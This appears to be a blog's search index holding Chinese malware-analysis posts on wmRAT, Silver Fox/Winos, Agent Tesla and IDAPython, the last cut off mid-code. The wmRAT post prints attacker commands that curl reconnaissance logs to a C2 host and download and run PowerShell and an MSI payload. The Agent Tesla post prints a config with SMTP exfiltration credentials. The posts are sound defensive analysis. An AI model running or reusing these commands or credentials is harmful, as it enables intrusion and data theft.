<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>蔓灵花组织wmRAT</title>
    <link href="/2024/10/10/%E8%94%93%E7%81%B5%E8%8A%B1%E7%BB%84%E7%BB%87wmRAT/"/>
    <url>/2024/10/10/%E8%94%93%E7%81%B5%E8%8A%B1%E7%BB%84%E7%BB%87wmRAT/</url>
    
    <content type="html"><![CDATA[<p>蔓灵花的wmRAT于2022年被首次披露，披露时远控指令只有16个，并且有一半的指令无实际功能，之后多次捕捉到更新版本，表明蔓灵花组织正在积极开发该远控木马。</p><p>基本攻击流程如下：</p><p><img src="/2024/10/10/%E8%94%93%E7%81%B5%E8%8A%B1%E7%BB%84%E7%BB%87wmRAT/image-20240822094500300.png" alt="image-20240822094500300"></p><p>其中计划任务下载的脚本程序会随请求的次数发生变化，以下是捕获的命名为cnv.oz的脚本命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> C:\Users\public\documents<br>tasklist &gt; list_file.log<br><span class="hljs-built_in">dir</span> %userprofile%\desktop /f &gt;&gt; list_file.log<br><span class="hljs-built_in">dir</span> %userprofile%\documents /f &gt;&gt; list_file.log<br><span class="hljs-built_in">dir</span> %userprofile%\downloads /f &gt;&gt; list_file.log<br>fsutil fsinfo drives &gt;&gt; list_file.log<br>wmic / namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName &gt;&gt; list_file.log<br>curl -X POST -F <span class="hljs-string">&quot;file=@C:\users\public\documents\list_file.log&quot;</span> http://www.edgardesignstudio.com/zdamup.php?ma=%computername%.%username%<br>del list_file.log<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://www.edgardesignstudio.com/zdamup.php?ma=mzz<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o %temp%\svc.log https://northgenstudios.com/hvc.log<br>more %temp%\svc.log | powershell<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o C:\<span class="hljs-built_in">users</span>\public\music\sys.msi http://edgardesignstudio.com/gsh/systu.msi<br>msiexec /i C:\<span class="hljs-built_in">users</span>\public\music\sys.msi /qn /norestart<br></code></pre></td></tr></table></figure><p>指令4下载的sys.msi将会释放wmRat。指令3将释放<a href="https://havocframework.com/">Havoc</a>生成的shellcode，在此不作描述。</p><h3 id="样本比较"><a href="#样本比较" class="headerlink" title="样本比较"></a>样本比较</h3><table><thead><tr><th align="center"></th><th align="center">ssve.exe</th><th align="center">MSI2729.tmp</th><th align="center">mvwes.exe</th></tr></thead><tbody><tr><td align="center">MD5</td><td align="center">F70358C0F33C793FF763F36AB0F94D89</td><td align="center">968DEFFE020C8A2A8C50AECBFCC8B420</td><td align="center">997A70907948909CBE387D0BF7DE7218</td></tr><tr><td align="center">sha1</td><td align="center">3ABA103F2D243AF44C0AB715956D2C0D0A9A58D8</td><td align="center">108E492BCB176054D858A8618631559C9C198895</td><td align="center">6318B57D44C9EFA56357157DCB1A8A84617DCDD6</td></tr><tr><td align="center">编译时间</td><td align="center">2022-12-12</td><td align="center">2023-12-11</td><td align="center">2024-06-07</td></tr><tr><td align="center">发现时间</td><td align="center">2023年3月</td><td align="center">2024年3月</td><td align="center">2024年8月</td></tr><tr><td align="center">C2域名</td><td align="center">jjwappconsole.com</td><td align="center">evtessentials.com</td><td align="center">umsmssvc.com</td></tr></tbody></table><h4 id="ssve-exe"><a href="#ssve-exe" class="headerlink" title="ssve.exe"></a>ssve.exe</h4><p>样本采集于客户主机，发现较早，结构、功能较简单</p><p>主函数如下</p><img src="image-20240822143420980.png" alt="image-20240822143420980" style="zoom:80%;" /><p>利用C++的全局变量初始化机制，将字符串的解密函数插入到启动函数mainCRTStartup中initterm所在的函数指针表下。</p><img src="image-20240822155341674.png" alt="image-20240822155341674" style="zoom:80%;" /><h4 id="MSI2729-tmp"><a href="#MSI2729-tmp" class="headerlink" title="MSI2729.tmp"></a>MSI2729.tmp</h4><p>主函数如下</p><img src="image-20240822162404526.png" alt="image-20240822162404526" style="zoom:80%;" /><p>这一版本在增加指令的基础上，增加了获取系统时区，获取杀软信息的操作</p><h4 id="mvwes-exe"><a href="#mvwes-exe" class="headerlink" title="mvwes.exe"></a>mvwes.exe</h4><img src="image-20240822162920099.png" alt="image-20240822162920099" style="zoom:80%;" /><p>这一版本同样增加完善了指令集，对关键指令和字符串进行了简单的移位加密或者异或移位加密</p><h3 id="模拟控制端"><a href="#模拟控制端" class="headerlink" title="模拟控制端"></a>模拟控制端</h3><p>以mvwes.exe为例实现控制端</p><img src="屏幕截图.png" alt="屏幕截图"  /><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.viewintech.com/detail?id=126">https://www.viewintech.com/detail?id=126</a></p><p><a href="https://rayblog.rising.com.cn/2024/07/2023%e5%b9%b412%e6%9c%88%ef%bc%9a%e8%94%93%e7%81%b5%e8%8a%b1%e7%bb%84%e7%bb%87%e9%92%88%e5%af%b9%e4%b8%ad%e5%9b%bd%e5%86%9b%e5%b7%a5%e4%bc%81%e4%b8%9a%e7%9a%84%e6%94%bb%e5%87%bb%e4%ba%8b%e4%bb%b6/">2023年12月：蔓灵花组织针对中国军工企业的攻击事件分析报告</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wmRAT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>银狐样本分析</title>
    <link href="/2024/07/12/%E9%93%B6%E7%8B%90%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/12/%E9%93%B6%E7%8B%90%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>来源：<a href="https://paper.seebug.org/3192/">不只是黑产？疑似筹划 APT 攻击的”银狐”团伙攻击活动分析</a></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">MD<span class="hljs-number">5</span>：<span class="hljs-number">7468</span>dd<span class="hljs-number">569</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">4087426012</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>bb<span class="hljs-number">1</span>b<span class="hljs-number">1227</span> Winos<br><span class="hljs-number">41</span>d<span class="hljs-number">9</span>f<span class="hljs-number">4201</span><span class="hljs-keyword">c</span><span class="hljs-number">9090</span>f<span class="hljs-number">2009727664431e80</span>d Winos<br></code></pre></td></tr></table></figure><p>样本执行流程图如下</p><p><img src="/2024/07/12/%E9%93%B6%E7%8B%90%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20240712133850017.png" alt="image-20240712133850017"></p><p>两个样本功能一致，以第二个文件为例</p><img src="image-20240711133333907.png" alt="image-20240711133333907"  /><p>显示加壳vmp2，但实际虽然存在vmp反调试的保护，但是未发现对代码段进行加密。</p><p>脱壳后发现第一层功能较为简单，加载“shellcode”资源，解密后执行</p><img src="image-20240711133854001.png" alt="image-20240711133854001" style="zoom:67%;" /><p>执行shellcode之后首先会对自身再进行一次异或解密</p><p><img src="/2024/07/12/%E9%93%B6%E7%8B%90%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20240711134723542.png" alt="image-20240711134723542"></p><p>动态获取VirtualAlloc、VirtualFree、RtlZeroMemory等函数地址，供下一步使用</p><p><img src="/2024/07/12/%E9%93%B6%E7%8B%90%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20240711155147459.png" alt="image-20240711155147459"></p><p>使用VirtualAlloc申请内存，使用RtlCopyMemory将palyload复制到内存地址中。可以看出palyload是一个PE文件，dump后可以进行进一步分析。</p><img src="屏幕截图 2024-07-12 091101.png" alt="屏幕截图 2024-07-12 091101" style="zoom:67%;" /><p>内存中动态加载系统dll</p><img src="image-20240712092655769.png" alt="image-20240712092655769" style="zoom: 80%;" /><p>跳转到加载的恶意Dll入口位置，执行payload</p><img src="image-20240712092825023.png" alt="image-20240712092825023" style="zoom:80%;" /><p>导出的palyload dll程序基本与网上曝漏的银狐组件一致</p><img src="image-20240712093838570.png" alt="image-20240712093838570" style="zoom: 67%;" /><p>获取C2配置信息，然后将包含C2配置信息的ShellCode代码设置为相应的注册表项</p><img src="image-20240712100834454.png" alt="image-20240712100834454" style="zoom:67%;" /><p>如果进程具备管理者权限则进行下一步工作</p><p><img src="/2024/07/12/%E9%93%B6%E7%8B%90%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20240712101327403.png" alt="image-20240712101327403"></p><p>判断是否存在360Tray.exe进程，如果存在，则在相应的目录下生成文件，并设置对应的注册表项。</p><p>上面的操作包括下面的使用explorer.exe断链启动，遍历进程确保WeGame.exe启动，结束360Tray.exe占用，都是为了<strong>绕过360核晶</strong>。</p><img src="image-20240712105914038.png" alt="image-20240712105914038" style="zoom:80%;" /><p>启动colorcpl.exe进程，然后查询之前包含C2配置信息的注册表项的ShellCode代码，然后将里面shellcode代码注入到colorcpl.exe进程</p><img src="image-20240712110427598.png" alt="image-20240712110427598" style="zoom:80%;" /><p>shellcode属于winos生成木马，包含明显的C2配置。</p><p><strong>参考：</strong></p><p><a href="https://xz.aliyun.com/t/14807">https://xz.aliyun.com/t/14807</a></p><p><a href="https://www.freebuf.com/articles/web/388013.html">https://www.freebuf.com/articles/web/388013.html</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>银狐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Agent Tesla变种分析</title>
    <link href="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/"/>
    <url>/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th><strong>窃密木马家族</strong></th><th>Agent Tesla</th></tr></thead><tbody><tr><td><strong>编译语言</strong></td><td>.NET</td></tr><tr><td><strong>首次发现时间</strong></td><td>2014年</td></tr><tr><td><strong>针对平台</strong></td><td>Windows</td></tr><tr><td><strong>主要传播方式</strong></td><td>网络钓鱼</td></tr><tr><td><strong>主要分析对抗技术</strong></td><td>载荷混淆、多层载荷加载、进程注入</td></tr><tr><td><strong>主要窃取目标</strong></td><td>系统数据、浏览器、电子邮件、FTP、VPN、远程连接工具、即时通讯软件、数据库、下载器</td></tr><tr><td><strong>其他恶意行为</strong></td><td>禁用系统功能、持久化</td></tr></tbody></table><h3 id="样本情况"><a href="#样本情况" class="headerlink" title="样本情况"></a>样本情况</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">文件名: SOA MAY.pdf<span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">__<span class="hljs-emphasis">_.exe</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">大小: 727552 字节</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">文件版本: 0.0.5.5</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">MD5: 6A5EDFEDCACD647606F65F573BA88FD5</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">SHA1: E03491D78351A41011798D2F713A5296DFCC0553</span></span><br></code></pre></td></tr></table></figure><img src="image-20240606150811291.png" alt="image-20240606150811291" style="zoom: 80%;" /><h3 id="样本释放第一层载荷"><a href="#样本释放第一层载荷" class="headerlink" title="样本释放第一层载荷"></a>样本释放第一层载荷</h3><p>获取名为“sahu”的资源对象，解码出RC4密钥“0x44 0x46 0x45 0x47 0x55 0x31 0x35 0x37 0x45 0x34 0x59 0x34 0x38 0x35 0x38 0x45 0x54 0x47 0x35 0x47 0x43 0x35”</p><p>使用密钥解码出下一个模块<em><strong>SimpleLogin</strong></em>，该模块为一个.net程序集的PE文件。</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605105053743.png" alt="image-20240605105053743"></p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605104740699.png" alt="image-20240605104740699"></p><p>通过反射机制获取程序集对象<em><strong>SimpleLogin</strong></em>，并创建Pia4ntb8MiUGvhGsP9.RLhDAEYwfjHvjWVq5a实例。</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605110535460.png" alt="image-20240605110535460"></p><p>传递的参数如下</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605143256507.png" alt="image-20240605143256507"></p><h3 id="第一层载荷"><a href="#第一层载荷" class="headerlink" title="第一层载荷"></a>第一层载荷</h3><p>sleep 10112ms</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605132316724.png" alt="image-20240605132316724"></p><p>解压缩名为“zzz”的资源数据</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605133352485.png" alt="image-20240605133352485"></p><p>以解压缩的资源数据为对象，加载程序集<em><strong>Gamma</strong></em>（第二层载荷）。并创建指向该数据集中 ReactionDiffusionLib.ReactionVessel 类的对象</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605134348472.png" alt="image-20240605134348472"></p><p>调用ReactionDiffusionLib.ReactionVessel类中的CausalitySource方法解出参数Zuob</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605143532924.png" alt="image-20240605143532924"></p><p>调用ReactionDiffusionLib.ReactionVessel类中的CausalitySource方法解出参数eir</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605143720424.png" alt="image-20240605143720424"></p><p>获取主程序的资源Zuob，并将该图片资源像素点数据转换为字节流</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605150218573.png" alt="image-20240605150218573"></p><p>调用ReactionDiffusionLib.ReactionVessel类中的SearchResult方法解码字节流，可以看到解码出的是一个PE程序</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605150521585.png" alt="image-20240605150521585"></p><p>加载解码出的程序集<em><strong>Tyrone</strong></em>（第三层载荷）</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605150910447.png" alt="image-20240605150910447"></p><p>执行程序集中 T3reatI1l1Onow9d2c.qnY1dVtHD4DbcDHSBN 类的RdihiuuJZA()方法</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240605151459824.png" alt="image-20240605151459824"></p><h3 id="第三层载荷"><a href="#第三层载荷" class="headerlink" title="第三层载荷"></a>第三层载荷</h3><p>创建互斥体，设置守护进程，进程睡眠0x19s</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240606100711489.png" alt="image-20240606100711489"></p><p>检查进程是否具有管理员权限，如果具有管理员权限，则添加自己为Windows Defender排除项</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240606100251936.png" alt="image-20240606100251936"></p><p>复制主程序到%AppData%路径下，并设置计划任务实现持久化</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240606102043756.png" alt="image-20240606102043756"></p><p>异或解码出<em><strong>Tyrone</strong></em>程序集中的 T71qM6HMRpQ 资源，解码后可以看到该资源是一个PE程序</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240606133347833.png" alt="image-20240606133347833"></p><p>将解码出的PE程序注入MSBuild.exe</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240606145228347.png" alt="image-20240606145228347"></p><h3 id="Agent-Tesla"><a href="#Agent-Tesla" class="headerlink" title="Agent Tesla"></a>Agent Tesla</h3><p><strong>MD5：3544CB0B8734581E6A729ED85D89D5FA</strong></p><p>结束除当前进程外的所有同名进程</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240607143632669.png" alt="image-20240607143632669"></p><p>初始化，获取一些设备信息，包括计算设备ID、获取设备IP等</p><img src="image-20240607144026979.png" alt="image-20240607144026979" style="zoom: 80%;" /><p>获取的设备信息</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240607144458892.png" alt="image-20240607144458892"></p><p>搜集Firefox、Chrome、Edge等28款浏览器的信息</p><img src="image-20240611095330611.png" alt="image-20240611095330611" style="zoom:67%;" /><p>搜集电子邮件、FTP、VPN、数据库等信息</p><img src="image-20240611100148680.png" alt="image-20240611100148680" style="zoom:67%;" /><p>发送邮件将收集到的信息发送出去</p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240611102037978.png" alt="image-20240611102037978"></p><p><img src="/2024/06/11/Agent-Tesla%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90/image-20240611101950439.png" alt="image-20240611101950439"></p><p>样本部分配置信息如图，可以看出有些功能并未打开，比如键盘记录、屏幕记录、剪切板记录等</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> PcHwid = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> ThisComputerName = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> AsmFilePath = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> PublicIpAddress = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> PublicIpAddressGrab = Convert.ToBoolean(<span class="hljs-string">&quot;true&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> IpApi = <span class="hljs-string">&quot;https://api.ipify.org&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> jcSOCBsUWLk.U8lcIO lastInputInf = <span class="hljs-literal">default</span>(jcSOCBsUWLk.U8lcIO);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> PublicUserAgent = <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> PcState = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> Log_text = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> EnableKeylogger = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> EnableScreenLogger = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> EnableClipboardLogger = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> EnableTorPanel = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> EnableCookies = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> EnableContacts = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> DeleteBackspace = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> TorPid = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> KeyloggerInterval = Convert.ToInt32(<span class="hljs-string">&quot;20&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> ScreenInterval = Convert.ToInt32(<span class="hljs-string">&quot;20&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> LogType = Convert.ToInt32(<span class="hljs-string">&quot;1&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> SmtpSSL = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> SmtpPort = Convert.ToInt32(<span class="hljs-string">&quot;587&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> SmtpAttach = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> SmtpServer = <span class="hljs-string">&quot;mail.mayedasselectromech.com&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> SmtpSender = <span class="hljs-string">&quot;nksharma@mayedasselectromech.com&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> SmtpPassword = <span class="hljs-string">&quot;India@2014&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> SmtpReceiver = <span class="hljs-string">&quot;solomonchimaobi709@gmail.com&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> AppAddStartup = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> HideFileStartup = Convert.ToBoolean(<span class="hljs-string">&quot;false&quot;</span>);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> AppStartupFullPath = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> StartupDirectoryPath = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> StartupEnvName = <span class="hljs-string">&quot;appdata&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> StartupDirectoryName = <span class="hljs-string">&quot;KRIPvjV&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> StartupInstallationName = <span class="hljs-string">&quot;KRIPvjV.exe&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> StartupRegName = <span class="hljs-string">&quot;KRIPvjV&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table><thead><tr><th align="center"></th><th align="center">模块描述</th><th align="center">功能描述</th></tr></thead><tbody><tr><td align="center">主样本</td><td align="center">SOA MAY.pdf_______________________________________________________________________.exe</td><td align="center">解密资源释放下一层载荷</td></tr><tr><td align="center">第一层载荷</td><td align="center">SimpleLogin</td><td align="center">解密资源释放下一层载荷</td></tr><tr><td align="center">第二层载荷</td><td align="center">Gamma</td><td align="center">提供解密函数</td></tr><tr><td align="center">第三层载荷</td><td align="center">Tyrone</td><td align="center">实现持久化功能等功能，向MSBuild注入playload</td></tr><tr><td align="center">注入MSBuild载荷</td><td align="center">fa16cf2d-8af2-4e7a-8bd2-d55470e17d2f</td><td align="center">Agent Tesla</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Agent Tesla</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDApython解码</title>
    <link href="/2024/05/16/IDApython%E8%A7%A3%E7%A0%81/"/>
    <url>/2024/05/16/IDApython%E8%A7%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>IDAPython是IDA Pro内置的一个强大工具，可以自动化处理繁琐的逆向工程任务。</p><p>IDAPython和IDC同样都是利用IDA Pro的api进行自动化操作的工具，其中IDAPython基于Python，而IDC是基于C的。  </p><p>IDAPython在2004年被开发出来，其目的是取代IDA自带的idc脚本引擎，提供更强大的扩展能力和自动化分析能力。</p><p>IDAPython由三个独立的模块组成：    </p><ul><li>第一个是 idc，它是封装 IDA 的 IDC 函数的兼容性模块。</li><li>第二个模块是 idautils，这是IDA 里的一个高级实用函数。</li><li>第三个模块是 idaapi，它允许访问更多低级数据，这些数据能够被类使用通过 IDA。</li></ul><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p><strong>here()</strong>        <strong>idc.get_screen_ea()</strong>     &#x2F;&#x2F;获取当前光标所在位置的地址，返回一个16进制的整型值</p><p><strong>ida_ida.inf_get_min_ea()</strong>    <strong>idc.get_inf_attr(INF_MIN_EA)</strong>         &#x2F;&#x2F;获取最小地址</p><p><strong>ida_ida.inf_get_max_ea()</strong>     <strong>idc.get_inf_attr(INF_MAX_EA)</strong>      &#x2F;&#x2F; 获取最大地址</p><p><strong>idc.get_segm_name(here())</strong>            &#x2F;&#x2F;获取当前段的名称</p><p><strong>idc.GetDisasm(here())</strong>                     &#x2F;&#x2F;获取当前地址的指令</p><p><strong>idc.print_insn_mnem(here())</strong>                   &#x2F;&#x2F;获取当前地址助记符</p><p><strong>idc.print_operand(here(),0)</strong>                  &#x2F;&#x2F;获取当前地址操作数</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">idautils.Functions()        <span class="hljs-regexp">//</span>将返回一个已知函数列表<br>idc.get_func_name()         <span class="hljs-regexp">//</span>返回函数名称<br><br><span class="hljs-regexp">//</span>返回所有函数地址和函数名称<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">func</span> <span class="hljs-keyword">in</span> idautils.Functions(): <br>print(<span class="hljs-string">&quot;0x%x, %s&quot;</span> % (<span class="hljs-keyword">func</span>, idc.get_func_name(<span 